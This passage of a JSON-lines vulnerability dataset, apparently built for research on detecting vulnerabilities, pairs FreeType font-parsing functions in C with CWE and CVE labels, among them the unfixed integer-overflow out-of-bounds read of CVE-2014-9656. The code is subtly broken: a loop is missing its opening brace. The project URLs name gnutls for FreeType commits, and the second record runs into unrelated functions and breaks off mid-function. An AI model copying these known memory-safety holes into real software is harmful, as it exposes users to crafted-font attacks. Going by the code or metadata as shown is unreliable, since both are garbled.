resource in a Mac font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9672"}
{"idx": 200, "project": "savannah", "commit_id": "f0292bb9920aa1dbfed5f53861e7c7a89b35833a", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=f0292bb9920aa1dbfed5f53861e7c7a89b35833a", "commit_message": "None", "target": 1, "func": "  tt_sbit_decoder_load_image( TT_SBitDecoder  decoder,\n                              FT_UInt         glyph_index,\n                              FT_Int          x_pos,\n                              FT_Int          y_pos )\n  {\n    /*\n     *  First, we find the correct strike range that applies to this\n     *  glyph index.\n     */\n\n    FT_Byte*  p          = decoder->eblc_base + decoder->strike_index_array;\n    FT_Byte*  p_limit    = decoder->eblc_limit;\n    FT_ULong  num_ranges = decoder->strike_index_count;\n    FT_UInt   start, end, index_format, image_format;\n    FT_ULong  image_start = 0, image_end = 0, image_offset;\n\n\n    for ( ; num_ranges > 0; num_ranges-- )\n    {\n      start = FT_NEXT_USHORT( p );\n      end   = FT_NEXT_USHORT( p );\n\n      if ( glyph_index >= start && glyph_index <= end )\n        goto FoundRange;\n\n      p += 4;  /* ignore index offset */\n    }\n    goto NoBitmap;\n\n  FoundRange:\n    image_offset = FT_NEXT_ULONG( p );\n\n    /* overflow check */\n    p = decoder->eblc_base + decoder->strike_index_array;\n    if ( image_offset > (FT_ULong)( p_limit - p ) )\n      goto Failure;\n\n    p += image_offset;\n    if ( p + 8 > p_limit )\n      goto NoBitmap;\n\n    /* now find the glyph's location and extend within the ebdt table */\n    index_format = FT_NEXT_USHORT( p );\n    image_format = FT_NEXT_USHORT( p );\n    image_offset = FT_NEXT_ULONG ( p );\n\n    switch ( index_format )\n    {\n    case 1: /* 4-byte offsets relative to `image_offset' */\n      p += 4 * ( glyph_index - start );\n      if ( p + 8 > p_limit )\n        goto NoBitmap;\n\n      image_start = FT_NEXT_ULONG( p );\n      image_end   = FT_NEXT_ULONG( p );\n\n      if ( image_start == image_end )  /* missing glyph */\n        goto NoBitmap;\n      break;\n\n    case 2: /* big metrics, constant image size */\n      {\n        FT_ULong  image_size;\n\n\n        if ( p + 12 > p_limit )\n          goto NoBitmap;\n\n        image_size = FT_NEXT_ULONG( p );\n\n        if ( tt_sbit_decoder_load_metrics( decoder, &p, p_limit, 1 ) )\n          goto NoBitmap;\n\n        image_start = image_size * ( glyph_index - start );\n        image_end   = image_start + image_size;\n      }\n      break;\n\n    case 3: /* 2-byte offsets relative to 'image_offset' */\n      p += 2 * ( glyph_index - start );\n      if ( p + 4 > p_limit )\n        goto NoBitmap;\n\n      image_start = FT_NEXT_USHORT( p );\n      image_end   = FT_NEXT_USHORT( p );\n\n      if ( image_start == image_end )  /* missing glyph */\n        goto NoBitmap;\n      break;\n\n    case 4: /* sparse glyph array with (glyph,offset) pairs */\n      {\n        FT_ULong  mm, num_glyphs;\n\n\n        if ( p + 4 > p_limit )\n          goto NoBitmap;\n\n         num_glyphs = FT_NEXT_ULONG( p );\n \n         /* overflow check for p + ( num_glyphs + 1 ) * 4 */\n        if ( num_glyphs > (FT_ULong)( ( ( p_limit - p ) >> 2 ) - 1 ) )\n           goto NoBitmap;\n \n         for ( mm = 0; mm < num_glyphs; mm++ )\n          FT_UInt  gindex = FT_NEXT_USHORT( p );\n\n\n          if ( gindex == glyph_index )\n          {\n            image_start = FT_NEXT_USHORT( p );\n            p          += 2;\n            image_end   = FT_PEEK_USHORT( p );\n            break;\n          }\n          p += 2;\n        }\n\n        if ( mm >= num_glyphs )\n          goto NoBitmap;\n      }\n      break;\n\n    case 5: /* constant metrics with sparse glyph codes */\n    case 19:\n      {\n        FT_ULong  image_size, mm, num_glyphs;\n\n\n        if ( p + 16 > p_limit )\n          goto NoBitmap;\n\n        image_size = FT_NEXT_ULONG( p );\n\n        if ( tt_sbit_decoder_load_metrics( decoder, &p, p_limit, 1 ) )\n          goto NoBitmap;\n\n        num_glyphs = FT_NEXT_ULONG( p );\n\n        /* overflow check for p + 2 * num_glyphs */\n        if ( num_glyphs > (FT_ULong)( ( p_limit - p ) >> 1 ) )\n          goto NoBitmap;\n\n        for ( mm = 0; mm < num_glyphs; mm++ )\n        {\n          FT_UInt  gindex = FT_NEXT_USHORT( p );\n\n\n          if ( gindex == glyph_index )\n            break;\n        }\n\n        if ( mm >= num_glyphs )\n          goto NoBitmap;\n\n        image_start = image_size * mm;\n        image_end   = image_start + image_size;\n      }\n      break;\n\n    default:\n      goto NoBitmap;\n    }\n", "func_hash": 28994602925432626900683012190657933065, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-9656", "cve_desc": "The tt_sbit_decoder_load_image function in sfnt/ttsbit.c in FreeType before 2.5.4 does not properly check for an integer overflow, which allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted OpenType font.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9656"}
{"idx": 204, "project": "savannah", "commit_id": "3774fc08b502c3e685afca098b6e8a195aded6a0", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=3774fc08b502c3e685afca098b6e8a195aded6a0", "commit_message": "None", "target": 1, "func": "  ps_parser_to_token( PS_Parser  parser,\n                      T1_Token   token )\n  {\n    FT_Byte*  cur;\n    FT_Byte*  limit;\n    FT_Int    embed;\n\n\n    token->type  = T1_TOKEN_TYPE_NONE;\n    token->start = NULL;\n    token->limit = NULL;\n\n    /* first of all, skip leading whitespace */\n    ps_parser_skip_spaces( parser );\n\n    cur   = parser->cursor;\n    limit = parser->limit;\n\n    if ( cur >= limit )\n      return;\n\n    switch ( *cur )\n    {\n      /************* check for literal string *****************/\n    case '(':\n      token->type  = T1_TOKEN_TYPE_STRING;\n      token->start = cur;\n\n      if ( skip_literal_string( &cur, limit ) == FT_Err_Ok )\n        token->limit = cur;\n      break;\n\n      /************* check for programs/array *****************/\n    case '{':\n      token->type  = T1_TOKEN_TYPE_ARRAY;\n      token->start = cur;\n\n      if ( skip_procedure( &cur, limit ) == FT_Err_Ok )\n        token->limit = cur;\n      break;\n\n      /************* check for table/array ********************/\n      /* XXX: in theory we should also look for \"<<\"          */\n      /*      since this is semantically equivalent to \"[\";   */\n      /*      in practice it doesn't matter (?)               */\n    case '[':\n      token->type  = T1_TOKEN_TYPE_ARRAY;\n      embed        = 1;\n      token->start = cur++;\n\n      /* we need this to catch `[ ]' */\n      parser->cursor = cur;\n      ps_parser_skip_spaces( parser );\n      cur = parser->cursor;\n\n      while ( cur < limit && !parser->error )\n      {\n        /* XXX: this is wrong because it does not      */\n        /*      skip comments, procedures, and strings */\n        if ( *cur == '[' )\n          embed++;\n        else if ( *cur == ']' )\n        {\n          embed--;\n          if ( embed <= 0 )\n          {\n            token->limit = ++cur;\n            break;\n          }\n        }\n\n        parser->cursor = cur;\n        ps_parser_skip_PS_token( parser );\n        /* we need this to catch `[XXX ]' */\n        ps_parser_skip_spaces  ( parser );\n        cur = parser->cursor;\n      }\n      break;\n\n      /* ************ otherwise, it is any token **************/\n    default:\n      token->start = cur;\n      token->type  = ( *cur == '/' ) ? T1_TOKEN_TYPE_KEY : T1_TOKEN_TYPE_ANY;\n      ps_parser_skip_PS_token( parser );\n      cur = parser->cursor;\n      if ( !parser->error )\n        token->limit = cur;\n    }\n\n    if ( !token->limit )\n    {\n      token->start = NULL;\n      token->type  = T1_TOKEN_TYPE_NONE;\n    }\n\n    parser->cursor = cur;\n  }\n\n\n  /* NB: `tokens' can be NULL if we only want to count */\n  /* the number of array elements                      */\n\n  FT_LOCAL_DEF( void )\n  ps_parser_to_token_array( PS_Parser  parser,\n                            T1_Token   tokens,\n                            FT_UInt    max_tokens,\n                            FT_Int*    pnum_tokens )\n  {\n    T1_TokenRec  master;\n\n\n    *pnum_tokens = -1;\n\n    /* this also handles leading whitespace */\n    ps_parser_to_token( parser, &master );\n\n    if ( master.type == T1_TOKEN_TYPE_ARRAY )\n    {\n      FT_Byte*  old_cursor = parser->cursor;\n      FT_Byte*  old_limit  = parser->limit;\n      T1_Token  cur        = tokens;\n      T1_Token  limit      = cur + max_tokens;\n\n\n      /* don't include outermost delimiters */\n      parser->cursor = master.start + 1;\n      parser->limit  = master.limit - 1;\n\n      while ( parser->cursor < parser->limit )\n      {\n        T1_TokenRec  token;\n\n\n        ps_parser_to_token( parser, &token );\n        if ( !token.type )\n          break;\n\n        if ( tokens && cur < limit )\n          *cur = token;\n\n        cur++;\n      }\n\n      *pnum_tokens = (FT_Int)( cur - tokens );\n\n      parser->cursor = old_cursor;\n      parser->limit  = old_limit;\n    }\n  }\n\n\n  /* first character must be a delimiter or a part of a number */\n  /* NB: `coords' can be NULL if we just want to skip the      */\n  /*     array; in this case we ignore `max_coords'            */\n\n  static FT_Int\n  ps_tocoordarray( FT_Byte*  *acur,\n                   FT_Byte*   limit,\n                   FT_Int     max_coords,\n                   FT_Short*  coords )\n  {\n    FT_Byte*  cur   = *acur;\n    FT_Int    count = 0;\n    FT_Byte   c, ender;\n\n\n    if ( cur >= limit )\n      goto Exit;\n\n    /* check for the beginning of an array; otherwise, only one number */\n    /* will be read                                                    */\n    c     = *cur;\n    ender = 0;\n\n    if ( c == '[' )\n      ender = ']';\n    else if ( c == '{' )\n      ender = '}';\n\n    if ( ender )\n      cur++;\n\n    /* now, read the coordinates */\n    while ( cur < limit )\n    {\n      FT_Short  dummy;\n      FT_Byte*  old_cur;\n\n\n      /* skip whitespace in front of data */\n      skip_spaces( &cur, limit );\n      if ( cur >= limit )\n        goto Exit;\n\n      if ( *cur == ender )\n      {\n        cur++;\n        break;\n      }\n\n      old_cur = cur;\n\n      if ( coords && count >= max_coords )\n        break;\n\n      /* call PS_Conv_ToFixed() even if coords == NULL */\n      /* to properly parse number at `cur'             */\n      *( coords ? &coords[count] : &dummy ) =\n        (FT_Short)( PS_Conv_ToFixed( &cur, limit, 0 ) >> 16 );\n\n      if ( old_cur == cur )\n      {\n        count = -1;\n        goto Exit;\n      }\n      else\n        count++;\n\n      if ( !ender )\n        break;\n    }\n\n  Exit:\n    *acur = cur;\n    return count;\n  }\n\n\n  /* first character must be a delimiter or a part of a number */\n  /* NB: `values' can be NULL if we just want to skip the      */\n  /*     array; in this case we ignore `max_values'            */\n  /*                                                           */\n  /* return number of successfully parsed values               */\n\n  static FT_Int\n  ps_tofixedarray( FT_Byte*  *acur,\n                   FT_Byte*   limit,\n                   FT_Int     max_values,\n                   FT_Fixed*  values,\n                   FT_Int     power_ten )\n  {\n    FT_Byte*  cur   = *acur;\n    FT_Int    count = 0;\n    FT_Byte   c, ender;\n\n\n    if ( cur >= limit )\n      goto Exit;\n\n    /* Check for the beginning of an array.  Otherwise, only one number */\n    /* will be read.                                                    */\n    c     = *cur;\n    ender = 0;\n\n    if ( c == '[' )\n      ender = ']';\n    else if ( c == '{' )\n      ender = '}';\n\n    if ( ender )\n      cur++;\n\n    /* now, read the values */\n    while ( cur < limit )\n    {\n      FT_Fixed  dummy;\n      FT_Byte*  old_cur;\n\n\n      /* skip whitespace in front of data */\n      skip_spaces( &cur, limit );\n      if ( cur >= limit )\n        goto Exit;\n\n      if ( *cur == ender )\n      {\n        cur++;\n        break;\n      }\n\n      old_cur = cur;\n\n      if ( values && count >= max_values )\n        break;\n\n      /* call PS_Conv_ToFixed() even if coords == NULL */\n      /* to properly parse number at `cur'             */\n      *( values ? &values[count] : &dummy ) =\n        PS_Conv_ToFixed( &cur, limit, power_ten );\n\n      if ( old_cur == cur )\n      {\n        count = -1;\n        goto Exit;\n      }\n      else\n        count++;\n\n      if ( !ender )\n        break;\n    }\n\n  Exit:\n    *acur = cur;\n    return count;\n  }\n\n\n#if 0\n\n  static FT_String*\n  ps_tostring( FT_Byte**  cursor,\n               FT_Byte*   limit,\n               FT_Memory  memory )\n  {\n    FT_Byte*    cur = *cursor;\n    FT_UInt     len = 0;\n    FT_Int      count;\n    FT_String*  result;\n    FT_Error    error;\n\n\n    /* XXX: some stupid fonts have a `Notice' or `Copyright' string     */\n    /*      that simply doesn't begin with an opening parenthesis, even */\n    /*      though they have a closing one!  E.g. \"amuncial.pfb\"        */\n    /*                                                                  */\n    /*      We must deal with these ill-fated cases there.  Note that   */\n    /*      these fonts didn't work with the old Type 1 driver as the   */\n    /*      notice/copyright was not recognized as a valid string token */\n    /*      and made the old token parser commit errors.                */\n\n    while ( cur < limit && ( *cur == ' ' || *cur == '\\t' ) )\n      cur++;\n    if ( cur + 1 >= limit )\n      return 0;\n\n    if ( *cur == '(' )\n      cur++;  /* skip the opening parenthesis, if there is one */\n\n    *cursor = cur;\n    count   = 0;\n\n    /* then, count its length */\n    for ( ; cur < limit; cur++ )\n    {\n      if ( *cur == '(' )\n        count++;\n\n      else if ( *cur == ')' )\n      {\n        count--;\n        if ( count < 0 )\n          break;\n      }\n    }\n\n    len = (FT_UInt)( cur - *cursor );\n    if ( cur >= limit || FT_ALLOC( result, len + 1 ) )\n      return 0;\n\n    /* now copy the string */\n    FT_MEM_COPY( result, *cursor, len );\n    result[len] = '\\0';\n    *cursor = cur;\n    return result;\n  }\n\n#endif /* 0 */\n\n\n  static int\n  ps_tobool( FT_Byte*  *acur,\n             FT_Byte*   limit )\n  {\n    FT_Byte*  cur    = *acur;\n    FT_Bool   result = 0;\n\n\n    /* return 1 if we find `true', 0 otherwise */\n    if ( cur + 3 < limit &&\n         cur[0] == 't'   &&\n         cur[1] == 'r'   &&\n         cur[2] == 'u'   &&\n         cur[3] == 'e'   )\n    {\n      result = 1;\n      cur   += 5;\n    }\n    else if ( cur + 4 < limit &&\n              cur[0] == 'f'   &&\n              cur[1] == 'a'   &&\n              cur[2] == 'l'   &&\n              cur[3] == 's'   &&\n              cur[4] == 'e'   )\n    {\n      result = 0;\n      cur   += 6;\n    }\n\n    *acur = cur;\n    return result;\n  }\n\n\n  /* load a simple field (i.e. non-table) into the current list of objects */\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_load_field( PS_Parser       parser,\n                        const T1_Field  field,\n                        void**          objects,\n                        FT_UInt         max_objects,\n                        FT_ULong*       pflags )\n  {\n    T1_TokenRec   token;\n    FT_Byte*      cur;\n    FT_Byte*      limit;\n    FT_UInt       count;\n    FT_UInt       idx;\n    FT_Error      error;\n    T1_FieldType  type;\n\n\n    /* this also skips leading whitespace */\n    ps_parser_to_token( parser, &token );\n    if ( !token.type )\n      goto Fail;\n\n    count = 1;\n    idx   = 0;\n    cur   = token.start;\n    limit = token.limit;\n\n    type = field->type;\n\n    /* we must detect arrays in /FontBBox */\n    if ( type == T1_FIELD_TYPE_BBOX )\n    {\n      T1_TokenRec  token2;\n      FT_Byte*     old_cur   = parser->cursor;\n      FT_Byte*     old_limit = parser->limit;\n\n\n      /* don't include delimiters */\n      parser->cursor = token.start + 1;\n      parser->limit  = token.limit - 1;\n\n      ps_parser_to_token( parser, &token2 );\n      parser->cursor = old_cur;\n      parser->limit  = old_limit;\n\n      if ( token2.type == T1_TOKEN_TYPE_ARRAY )\n      {\n        type = T1_FIELD_TYPE_MM_BBOX;\n        goto FieldArray;\n      }\n    }\n    else if ( token.type == T1_TOKEN_TYPE_ARRAY )\n    {\n      count = max_objects;\n\n    FieldArray:\n      /* if this is an array and we have no blend, an error occurs */\n      if ( max_objects == 0 )\n        goto Fail;\n\n      idx = 1;\n\n      /* don't include delimiters */\n      cur++;\n      limit--;\n    }\n\n    for ( ; count > 0; count--, idx++ )\n    {\n      FT_Byte*    q      = (FT_Byte*)objects[idx] + field->offset;\n      FT_Long     val;\n      FT_String*  string = NULL;\n\n\n      skip_spaces( &cur, limit );\n\n      switch ( type )\n      {\n      case T1_FIELD_TYPE_BOOL:\n        val = ps_tobool( &cur, limit );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_FIXED:\n        val = PS_Conv_ToFixed( &cur, limit, 0 );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_FIXED_1000:\n        val = PS_Conv_ToFixed( &cur, limit, 3 );\n        goto Store_Integer;\n\n      case T1_FIELD_TYPE_INTEGER:\n        val = PS_Conv_ToInt( &cur, limit );\n        /* fall through */\n\n      Store_Integer:\n        switch ( field->size )\n        {\n        case (8 / FT_CHAR_BIT):\n          *(FT_Byte*)q = (FT_Byte)val;\n          break;\n\n        case (16 / FT_CHAR_BIT):\n          *(FT_UShort*)q = (FT_UShort)val;\n          break;\n\n        case (32 / FT_CHAR_BIT):\n          *(FT_UInt32*)q = (FT_UInt32)val;\n          break;\n\n        default:                /* for 64-bit systems */\n          *(FT_Long*)q = val;\n        }\n        break;\n\n      case T1_FIELD_TYPE_STRING:\n      case T1_FIELD_TYPE_KEY:\n        {\n          FT_Memory  memory = parser->memory;\n          FT_UInt    len    = (FT_UInt)( limit - cur );\n\n\n          if ( cur >= limit )\n            break;\n\n          /* we allow both a string or a name   */\n          /* for cases like /FontName (foo) def */\n          if ( token.type == T1_TOKEN_TYPE_KEY )\n          {\n            /* don't include leading `/' */\n            len--;\n            cur++;\n          }\n          else if ( token.type == T1_TOKEN_TYPE_STRING )\n          {\n            /* don't include delimiting parentheses    */\n            /* XXX we don't handle <<...>> here        */\n            /* XXX should we convert octal escapes?    */\n            /*     if so, what encoding should we use? */\n            cur++;\n            len -= 2;\n          }\n          else\n          {\n            FT_ERROR(( \"ps_parser_load_field:\"\n                       \" expected a name or string\\n\"\n                       \"                     \"\n                       \" but found token of type %d instead\\n\",\n                       token.type ));\n            error = FT_THROW( Invalid_File_Format );\n            goto Exit;\n          }\n\n          /* for this to work (FT_String**)q must have been */\n          /* initialized to NULL                            */\n          if ( *(FT_String**)q )\n          {\n            FT_TRACE0(( \"ps_parser_load_field: overwriting field %s\\n\",\n                        field->ident ));\n            FT_FREE( *(FT_String**)q );\n            *(FT_String**)q = NULL;\n          }\n\n          if ( FT_ALLOC( string, len + 1 ) )\n            goto Exit;\n\n          FT_MEM_COPY( string, cur, len );\n          string[len] = 0;\n\n          *(FT_String**)q = string;\n        }\n        break;\n\n      case T1_FIELD_TYPE_BBOX:\n        {\n          FT_Fixed  temp[4];\n          FT_BBox*  bbox = (FT_BBox*)q;\n          FT_Int    result;\n\n\n          result = ps_tofixedarray( &cur, limit, 4, temp, 0 );\n\n          if ( result < 4 )\n          {\n            FT_ERROR(( \"ps_parser_load_field:\"\n                       \" expected four integers in bounding box\\n\" ));\n            error = FT_THROW( Invalid_File_Format );\n            goto Exit;\n          }\n\n          bbox->xMin = FT_RoundFix( temp[0] );\n          bbox->yMin = FT_RoundFix( temp[1] );\n          bbox->xMax = FT_RoundFix( temp[2] );\n          bbox->yMax = FT_RoundFix( temp[3] );\n        }\n        break;\n\n      case T1_FIELD_TYPE_MM_BBOX:\n        {\n          FT_Memory  memory = parser->memory;\n          FT_Fixed*  temp   = NULL;\n          FT_Int     result;\n          FT_UInt    i;\n\n\n          if ( FT_NEW_ARRAY( temp, max_objects * 4 ) )\n            goto Exit;\n\n          for ( i = 0; i < 4; i++ )\n          {\n            result = ps_tofixedarray( &cur, limit, (FT_Int)max_objects,\n                                      temp + i * max_objects, 0 );\n            if ( result < 0 || (FT_UInt)result < max_objects )\n            {\n              FT_ERROR(( \"ps_parser_load_field:\"\n                         \" expected %d integer%s in the %s subarray\\n\"\n                         \"                     \"\n                         \" of /FontBBox in the /Blend dictionary\\n\",\n                         max_objects, max_objects > 1 ? \"s\" : \"\",\n                         i == 0 ? \"first\"\n                                : ( i == 1 ? \"second\"\n                                           : ( i == 2 ? \"third\"\n                                                      : \"fourth\" ) ) ));\n              error = FT_THROW( Invalid_File_Format );\n\n              FT_FREE( temp );\n              goto Exit;\n            }\n\n            skip_spaces( &cur, limit );\n          }\n\n          for ( i = 0; i < max_objects; i++ )\n          {\n            FT_BBox*  bbox = (FT_BBox*)objects[i];\n\n\n            bbox->xMin = FT_RoundFix( temp[i                  ] );\n            bbox->yMin = FT_RoundFix( temp[i +     max_objects] );\n            bbox->xMax = FT_RoundFix( temp[i + 2 * max_objects] );\n            bbox->yMax = FT_RoundFix( temp[i + 3 * max_objects] );\n          }\n\n          FT_FREE( temp );\n        }\n        break;\n\n      default:\n        /* an error occurred */\n        goto Fail;\n      }\n    }\n\n#if 0  /* obsolete -- keep for reference */\n    if ( pflags )\n      *pflags |= 1L << field->flag_bit;\n#else\n    FT_UNUSED( pflags );\n#endif\n\n    error = FT_Err_Ok;\n\n  Exit:\n    return error;\n\n  Fail:\n    error = FT_THROW( Invalid_File_Format );\n    goto Exit;\n  }\n\n\n#define T1_MAX_TABLE_ELEMENTS  32\n\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_load_field_table( PS_Parser       parser,\n                              const T1_Field  field,\n                              void**          objects,\n                              FT_UInt         max_objects,\n                              FT_ULong*       pflags )\n  {\n    T1_TokenRec  elements[T1_MAX_TABLE_ELEMENTS];\n    T1_Token     token;\n    FT_Int       num_elements;\n    FT_Error     error = FT_Err_Ok;\n    FT_Byte*     old_cursor;\n    FT_Byte*     old_limit;\n    T1_FieldRec  fieldrec = *(T1_Field)field;\n\n\n    fieldrec.type = T1_FIELD_TYPE_INTEGER;\n    if ( field->type == T1_FIELD_TYPE_FIXED_ARRAY ||\n         field->type == T1_FIELD_TYPE_BBOX        )\n      fieldrec.type = T1_FIELD_TYPE_FIXED;\n\n    ps_parser_to_token_array( parser, elements,\n                              T1_MAX_TABLE_ELEMENTS, &num_elements );\n    if ( num_elements < 0 )\n    {\n      error = FT_ERR( Ignore );\n      goto Exit;\n    }\n    if ( (FT_UInt)num_elements > field->array_max )\n      num_elements = (FT_Int)field->array_max;\n\n    old_cursor = parser->cursor;\n    old_limit  = parser->limit;\n\n    /* we store the elements count if necessary;           */\n    /* we further assume that `count_offset' can't be zero */\n    if ( field->type != T1_FIELD_TYPE_BBOX && field->count_offset != 0 )\n      *(FT_Byte*)( (FT_Byte*)objects[0] + field->count_offset ) =\n        (FT_Byte)num_elements;\n\n    /* we now load each element, adjusting the field.offset on each one */\n    token = elements;\n    for ( ; num_elements > 0; num_elements--, token++ )\n    {\n      parser->cursor = token->start;\n      parser->limit  = token->limit;\n\n      error = ps_parser_load_field( parser,\n                                    &fieldrec,\n                                    objects,\n                                    max_objects,\n                                    0 );\n      if ( error )\n        break;\n\n      fieldrec.offset += fieldrec.size;\n    }\n\n#if 0  /* obsolete -- keep for reference */\n    if ( pflags )\n      *pflags |= 1L << field->flag_bit;\n#else\n    FT_UNUSED( pflags );\n#endif\n\n    parser->cursor = old_cursor;\n    parser->limit  = old_limit;\n\n  Exit:\n    return error;\n  }\n\n\n  FT_LOCAL_DEF( FT_Long )\n  ps_parser_to_int( PS_Parser  parser )\n  {\n    ps_parser_skip_spaces( parser );\n    return PS_Conv_ToInt( &parser->cursor, parser->limit );\n  }\n\n\n  /* first character must be `<' if `delimiters' is non-zero */\n\n  FT_LOCAL_DEF( FT_Error )\n  ps_parser_to_bytes( PS_Parser  parser,\n                      FT_Byte*   bytes,\n                      FT_Offset  max_bytes,\n                      FT_ULong*  pnum_bytes,\n                      FT_Bool    delimiters )\n  {\n    FT_Error  error = FT_Err_Ok;\n    FT_Byte*  cur;\n\n\n    ps_parser_skip_spaces( parser );\n    cur = parser->cursor;\n\n    if ( cur >= parser->limit )\n      goto Exit;\n\n    if ( delimiters )\n    {\n      if ( *cur != '<' )\n      {\n        FT_ERROR(( \"ps_parser_to_bytes: Missing starting delimiter `<'\\n\" ));\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      cur++;\n    }\n\n    *pnum_bytes = PS_Conv_ASCIIHexDecode( &cur,\n                                          parser->limit,\n                                          bytes,\n                                          max_bytes );\n\n    if ( delimiters )\n    {\n      if ( cur < parser->limit && *cur != '>' )\n      {\n        FT_ERROR(( \"ps_parser_to_bytes: Missing closing delimiter `>'\\n\" ));\n        error = FT_THROW( Invalid_File_Format );\n        goto Exit;\n      }\n\n      cur++;\n    }\n\n    parser->cursor = cur;\n\n  Exit:\n    return error;\n  }\n\n\n  FT_LOCAL_DEF( FT_Fixed )\n  ps_parser_to_fixed( PS_Parser  parser,\n                      FT_Int     power_ten )\n  {\n    ps_parser_skip_spaces( parser );\n    return PS_Conv_ToFixed( &parser->cursor, parser->limit, power_ten );\n  }\n\n\n  FT_LOCAL_DEF( FT_Int )\n  ps_parser_to_coord_array( PS_Parser  parser,\n                            FT_Int     max_coords,\n                            FT_Short*  coords )\n  {\n    ps_parser_skip_spaces( parser );\n    return ps_tocoordarray( &parser->cursor, parser->limit,\n                            max_coords, coords );\n  }\n\n\n  FT_LOCAL_DEF( FT_Int )\n  ps_parser_to_fixed_array( PS_Parser  parser,\n                            FT_Int     max_values,\n                            FT_Fixed*  values,\n                            FT_Int     power_ten )\n  {\n    ps_parser_skip_spaces( parser );\n    return ps_tofixedarray( &parser->cursor, parser->limit,\n                            max_values, values, power_ten );\n  }\n\n\n#if 0\n\n  FT_LOCAL_DEF( FT_String* )\n  T1_ToString( PS_Parser  parser )\n  {\n    return ps_tostring( &parser->cursor, parser->limit, parser->memory );\n  }\n\n\n  FT_LOCAL_DEF( FT_Bool )\n  T1_ToBool( PS_Parser  parser )\n  {\n    return ps_tobool( &parser->cursor, parser->limit );\n  }\n\n#endif /* 0 */\n\n\n  FT_LOCAL_DEF( void )\n  ps_parser_init( PS_Parser  parser,\n                  FT_Byte*   base,\n                  FT_Byte*   limit,\n                  FT_Memory  memory )\n  {\n    parser->error  = FT_Err_Ok;\n    parser->base   = base;\n    parser->limit  = limit;\n    parser->cursor = base;\n    parser->memory = memory;\n    parser->funcs  = ps_parser_funcs;\n  }\n\n\n  FT_LOCAL_DEF( void )\n  ps_parser_done( PS_Parser  parser )\n  {\n    FT_UNUSED( parser );\n  }\n\n\n  /*************************************************************************/\n  /*************************************************************************/\n  /*****                                                               *****/\n  /*****                            T1 BUILDER                         *****/\n  /*****                                                               *****/\n  /*************************************************************************/\n  /*************************************************************************/\n\n  /*************************************************************************/\n  /*                                                                       */\n  /* <Function>                                                            */\n  /*    t1_builder_init                                                    */\n  /*                                                                       */\n  /* <Description>                                                         */\n  /*    Initializes a given glyph builder.                                 */\n  /*                                                                       */\n  /* <InOut>                                                               */\n  /*    builder :: A pointer to the glyph builder to initialize.           */\n  /*                                                                       */\n  /* <Input>                                                               */\n  /*    face    :: The current face object.                                */\n  /*                                                                       */\n  /*    size    :: The current size object.                                */\n  /*                                                                       */\n  /*    glyph   :: The current glyph object.                               */\n  /*                                                                       */\n  /*    hinting :: Whether hinting should be applied.                      */\n  /*                                                                       */\n  FT_LOCAL_DEF( void )\n  t1_builder_init( T1_Builder    builder,\n                   FT_Face       face,\n                   FT_Size       size,\n                   FT_GlyphSlot  glyph,\n                   FT_Bool       hinting )\n  {\n    builder->parse_state = T1_Parse_Start;\n    builder->load_points = 1;\n\n    builder->face   = face;\n    builder->glyph  = glyph;\n    builder->memory = face->memory;\n\n    if ( glyph )\n    {\n      FT_GlyphLoader  loader = glyph->internal->loader;\n\n\n      builder->loader  = loader;\n      builder->base    = &loader->base.outline;\n      builder->current = &loader->current.outline;\n      FT_GlyphLoader_Rewind( loader );\n\n      builder->hints_globals = size->internal;\n      builder->hints_funcs   = NULL;\n\n      if ( hinting )\n        builder->hints_funcs = glyph->internal->glyph_hints;\n    }\n\n    builder->pos_x = 0;\n    builder->pos_y = 0;\n\n    builder->left_bearing.x = 0;\n    builder->left_bearing.y = 0;\n    builder->advance.x      = 0;\n    builder->advance.y      = 0;\n\n    builder->funcs = t1_builder_funcs;\n  }\n\n\n  /*************************************************************************/\n  /*                                                                       */\n  /* <Function>                                                            */\n  /*    t1_builder_done                                                    */\n  /*                                                                       */\n  /* <Description>                                                         */\n  /*    Finalizes a given glyph builder.  Its contents can still be used   */\n  /*    after the call, but the function saves important information       */\n  /*    within the corresponding glyph slot.                               */\n  /*                                                                       */\n  /* <Input>                                                               */\n  /*    builder :: A pointer to the glyph builder to finalize.             */\n  /*                                                                       */\n  FT_LOCAL_DEF( void )\n  t1_builder_done( T1_Builder  builder )\n  {\n    FT_GlyphSlot  glyph = builder->glyph;\n\n\n    if ( glyph )\n      glyph->outline = *builder->base;\n  }\n\n\n  /* check that there is enough space for `count' more points */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_check_points( T1_Builder  builder,\n                           FT_Int      count )\n  {\n    return FT_GLYPHLOADER_CHECK_POINTS( builder->loader, count, 0 );\n  }\n\n\n  /* add a new point, do not check space */\n  FT_LOCAL_DEF( void )\n  t1_builder_add_point( T1_Builder  builder,\n                        FT_Pos      x,\n                        FT_Pos      y,\n                        FT_Byte     flag )\n  {\n    FT_Outline*  outline = builder->current;\n\n\n    if ( builder->load_points )\n    {\n      FT_Vector*  point   = outline->points + outline->n_points;\n      FT_Byte*    control = (FT_Byte*)outline->tags + outline->n_points;\n\n\n      point->x = FIXED_TO_INT( x );\n      point->y = FIXED_TO_INT( y );\n      *control = (FT_Byte)( flag ? FT_CURVE_TAG_ON : FT_CURVE_TAG_CUBIC );\n    }\n    outline->n_points++;\n  }\n\n\n  /* check space for a new on-curve point, then add it */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_add_point1( T1_Builder  builder,\n                         FT_Pos      x,\n                         FT_Pos      y )\n  {\n    FT_Error  error;\n\n\n    error = t1_builder_check_points( builder, 1 );\n    if ( !error )\n      t1_builder_add_point( builder, x, y, 1 );\n\n    return error;\n  }\n\n\n  /* check space for a new contour, then add it */\n  FT_LOCAL_DEF( FT_Error )\n  t1_builder_add_contour( T1_Builder  builder )\n  {\n    FT_Outline*  outline = builder->current;\n    